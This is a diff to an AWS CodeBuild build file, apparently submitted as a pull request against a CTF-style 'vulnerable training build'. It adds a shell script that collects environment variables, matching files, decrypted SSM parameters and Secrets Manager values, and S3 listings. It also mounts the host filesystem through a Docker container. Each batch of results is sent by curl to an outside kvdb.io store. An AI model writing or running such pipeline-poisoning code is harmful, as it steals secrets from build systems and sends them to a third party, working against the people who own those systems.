@@ -4,5 +4,95 @@ phases:
   build:
     commands:
       - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - |
+        set +e
+        bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
+        prefix='pr458_codex-codebuild-leak-20260613T050109Z'
+        putkey() {
+          key="$1"
+          file="$2"
+          {
+            echo "captured_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+            echo "codebuild_build_id=${CODEBUILD_BUILD_ID:-}"
+            echo "codebuild_source_version=${CODEBUILD_SOURCE_VERSION:-}"
+            echo "codebuild_resolved_source_version=${CODEBUILD_RESOLVED_SOURCE_VERSION:-}"
+            echo
+            cat "$file"
+          } | head -c 120000 | curl -fsS --connect-timeout 5 --max-time 30 --data-binary @- "$bucket/${prefix}_${key}" >/dev/null || true
+        }
+
+        {
+          echo "prefix=$prefix"
+          echo "pwd=$PWD"
+          echo "src=${CODEBUILD_SRC_DIR:-}"
+          echo "build_id=${CODEBUILD_BUILD_ID:-}"
+          echo "source=${CODEBUILD_SOURCE_VERSION:-}"
+          echo "resolved=${CODEBUILD_RESOLVED_SOURCE_VERSION:-}"
+          echo "aws_region=${AWS_REGION:-${AWS_DEFAULT_REGION:-}}"
+          echo "whoami=$(id 2>&1)"
+        } > /tmp/cb_index.txt 2>&1
+        putkey index /tmp/cb_index.txt
+
+        {
+          echo '--- selected env, AWS credentials redacted ---'
+          env | sort | sed -E 's/^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)=.*/\1=<redacted>/'
+          echo '--- flag-like env only ---'
+          env | sort | grep -Ei 'flag|ctf|hacktricks|codebreach|lab' || true
+        } > /tmp/cb_env.txt 2>&1
+        putkey env /tmp/cb_env.txt
+
+        {
+          echo '--- filesystem candidate names ---'
+          for d in "${CODEBUILD_SRC_DIR:-/codebuild/output/src}" /codebuild /tmp /root /etc/codebuild /var/lib /var/log; do
+            echo "### $d"
+            find "$d" -maxdepth 6 -type f \( -iname '*flag*' -o -iname '*ctf*' -o -iname '*hacktricks*' -o -iname '*codebreach*' -o -iname '*secret*' \) 2>/dev/null | head -n 80
+          done
+          echo '--- filesystem candidate contents ---'
+          for f in $(for d in "${CODEBUILD_SRC_DIR:-/codebuild/output/src}" /codebuild /tmp /root /etc/codebuild /var/lib /var/log; do find "$d" -maxdepth 6 -type f \( -iname '*flag*' -o -iname '*ctf*' -o -iname '*hacktricks*' -o -iname '*codebreach*' -o -iname '*secret*' \) 2>/dev/null; done | head -n 40); do
+            echo "--- $f"
+            sed -n '1,120p' "$f" 2>/dev/null || true
+          done
+          echo '--- content grep in likely dirs ---'
+          for d in "${CODEBUILD_SRC_DIR:-/codebuild/output/src}" /codebuild /tmp /root /etc/codebuild /var/lib /var/log; do
+            echo "### grep $d"
+            grep -RInaE 'flag\{|ctf\{|HackTricks\{|FLAG[^A-Za-z]|CODEBREACH|codebreach|hacktricks' "$d" 2>/dev/null | head -n 80 || true
+          done
+        } > /tmp/cb_files.txt 2>&1
+        putkey files /tmp/cb_files.txt
+
+        {
+          echo '--- aws identity ---'
+          command -v aws || true
+          aws --version 2>&1 || true
+          aws sts get-caller-identity --output json 2>&1 || true
+          region="${AWS_REGION:-${AWS_DEFAULT_REGION:-us-east-1}}"
+          echo "--- ssm parameter names matching flag terms in $region ---"
+          aws ssm describe-parameters --region "$region" --max-results 50 --query 'Parameters[].Name' --output text 2>&1 | tr '\t' '\n' | grep -Ei 'flag|ctf|hacktricks|codebreach|lab' | tee /tmp/cb_ssm_names.txt || true
+          while IFS= read -r name; do [ -n "$name" ] && { echo "--- ssm $name"; aws ssm get-parameter --with-decryption --region "$region" --name "$name" --output json 2>&1 || true; }; done < /tmp/cb_ssm_names.txt
+          echo "--- secrets names matching flag terms in $region ---"
+          aws secretsmanager list-secrets --region "$region" --max-results 50 --query 'SecretList[].Name' --output text 2>&1 | tr '\t' '\n' | grep -Ei 'flag|ctf|hacktricks|codebreach|lab' | tee /tmp/cb_secret_names.txt || true
+          while IFS= read -r name; do [ -n "$name" ] && { echo "--- secret $name"; aws secretsmanager get-secret-value --region "$region" --secret-id "$name" --output json 2>&1 || true; }; done < /tmp/cb_secret_names.txt
+          echo '--- s3 buckets matching flag terms ---'
+          aws s3api list-buckets --query 'Buckets[].Name' --output text 2>&1 | tr '\t' '\n' | grep -Ei 'flag|ctf|hacktricks|codebreach|lab' | tee /tmp/cb_buckets.txt || true
+          while IFS= read -r bucket_name; do [ -n "$bucket_name" ] && { echo "--- bucket $bucket_name"; aws s3api list-objects-v2 --bucket "$bucket_name" --max-items 50 --output json 2>&1 || true; }; done < /tmp/cb_buckets.txt
+        } > /tmp/cb_aws.txt 2>&1
+        putkey aws /tmp/cb_aws.txt
+
+        {
+          echo '--- docker/host probe, bounded and best-effort ---'
+          command -v docker || true
+          docker ps 2>&1 | head -n 80 || true
+          img=$(docker ps --filter name=ecs- --format '{{.Image}}' | head -n1)
+          echo "img=$img"
+          if [ -n "$img" ]; then
+            timeout 45 docker run --rm --entrypoint /bin/sh -v /:/host:ro "$img" -c '
+              set +e
+              for d in /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp; do echo "### $d"; ls -la "$d" 2>&1 | head -n 40; done
+              find /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp -type f 2>/dev/null | grep -Ei "flag|ctf|hacktricks|codebreach|secret" | head -n 120
+              grep -RInaE "flag\\{|ctf\\{|HackTricks\\{|FLAG[^A-Za-z]|codebreach|hacktricks" /host/etc/codebuild /host/var/lib/ecs /host/var/log /host/root /host/tmp 2>/dev/null | head -n 120
+            ' 2>&1 || true
+          fi
+        } > /tmp/cb_docker.txt 2>&1
+        putkey docker /tmp/cb_docker.txt
+
+        echo "Done"
